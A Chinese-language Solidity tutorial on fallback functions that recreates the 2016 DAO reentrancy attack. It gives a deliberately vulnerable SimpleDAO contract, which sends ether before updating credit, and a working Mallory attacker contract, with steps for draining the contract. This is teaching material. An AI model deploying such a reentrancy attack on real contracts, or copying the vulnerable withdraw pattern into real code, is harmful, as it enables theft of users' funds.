# `fallback` 函数

一份合约可以有一个无名函数。该函数不能接收参数，也不能有返回。当调用合约时，如果没有函数与给定的函数签名匹配（或者根本没有指定），就执行`fallback`函数。

此外，只要合约收到以太币（无数据），就执行该函数。为了接收以太币，`fallback`函数必须标记为`payable`。

在最坏情况下，`fallback`函数只能依赖2300 gas，除了基本的日志记录外，几乎没有机会执行其他操作。以下操作将消耗多于2300 gas：

* 写存储
* 创建合约
* 调用消耗大量gas的外部函数
* 发送以太币

与其他函数类似，只要有足够的gas，`fallback`函数就可以执行复杂的操作。

**注**：即使`fallback`函数不能传入参数，仍然可以使用`msg.data`检索任何调用提供的负载。

```solidity
pragma solidity ^0.4.0;

contract Test {
    function() public { x = 1; }
    uint x;
}

contract Sink {
    function() public payable { }
}

contract Caller {
    function callTest(Test test) public {
        test.call(0xabcdef01);
    }
}
```

所有调用`Test`合约的交易都会触发`fallback`函数。向该合约发送以太币会引起一场，因为`fallback`函数没有修饰字`payable`。

`Sink`合约将所有发送给它的以太币存入合约地址，无法取回。

如果`call`的哈希值不存在，`test.x`被赋值为1。

## DAO攻击

DAO是合约实现的众筹平台，在2016年6月18日被攻击前筹集了$150M。区块链硬分叉宣布攻击中的交易无效前，攻击者设法控制了$60M。

我们编写与原始DAO具有相同脆弱点的简化的`SimpleDAO`。

```solidity
pragma solidity ^0.3.1;

contract SimpleDAO {
  mapping (address => uint) public credit;
    
  function donate(address to) {
    credit[to] += msg.value;
  }
    
  function withdraw(uint amount) {
    if (credit[msg.sender]>= amount) {
      msg.sender.call.value(amount)();
      credit[msg.sender]-=amount;
    }
  }  

  function queryCredit(address to) returns (uint){
    return credit[to];
  }
}
```

`SimpleDAO`允许参与者`donate`基金合约；`withdraw`基金。

合约`Mallory`是利用脆弱点的攻击。与真实使用在DAO上的攻击相似，`Mallory`允许攻击者从`SimpleDAO`中窃取所有的以太币。

首先，部署`Mallory`，构造时传入DAO的地址。

```
pragma solidity ^0.3.1;

contract Mallory {
  SimpleDAO public dao;
  address owner;

  function Mallory(SimpleDAO addr){ 
    owner = msg.sender;
    dao = addr;
  }
  
  function getJackpot() { 
    owner.send(this.balance); 
  }

  function() payable { 
    dao.withdraw(dao.queryCredit(this)); 
  }
}
```

然后，攻击者向`Mallory` `donate`以太币。等待他人增加DAO的余额。

最后，调用`Mallory`的`fallback`函数来清空DAO。`fallback`函数调用`withdraw`，将以太币发送给`Mallory`。合约中的`call`调用`Mallory`的`fallback`，恶意地再次调用`withdraw`。由于`withdraw`在更新`credit`域前中断了，所以余额检查再次成功。因此，DAO第二次向`Mallory`发送以太币，并再次调用`fallback`，导致循环，直到：1)gas耗尽；2)栈满；3)DAO的余额归零。


